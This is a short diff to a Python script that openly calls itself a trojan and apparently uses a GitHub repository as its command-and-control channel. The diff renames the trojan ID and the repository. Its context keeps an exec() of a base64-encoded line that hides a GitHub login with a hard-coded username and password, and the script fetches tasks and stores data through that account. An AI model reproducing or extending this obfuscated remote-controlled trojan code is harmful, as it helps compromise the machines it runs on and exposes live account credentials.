@@ -11,7 +11,7 @@ import Queue
 import threading
 from github3 import login
 
-trojan_id = "abc"
+trojan_id = "example"
 trojan_config = "%s.json" % trojan_id
 configured = False
 data_path = "data/%s/" % trojan_id
@@ -20,7 +20,7 @@ task_queue = Queue.Queue()
 
 def connectToGit():
 	exec(base64.b64decode("Z2ggPSBsb2dpbih1c2VybmFtZSA9ICJHSFRIWVMiLCBwYXNzd29yZCA9ICJ6ejEzMzE1NTE2NiIp"))
-	repo = gh.repository("GHTHYS", "chapter")
+	repo = gh.repository("GHTHYS", "Trojan")
 	branch = repo.branch("master")
 	return gh, repo, branch
 
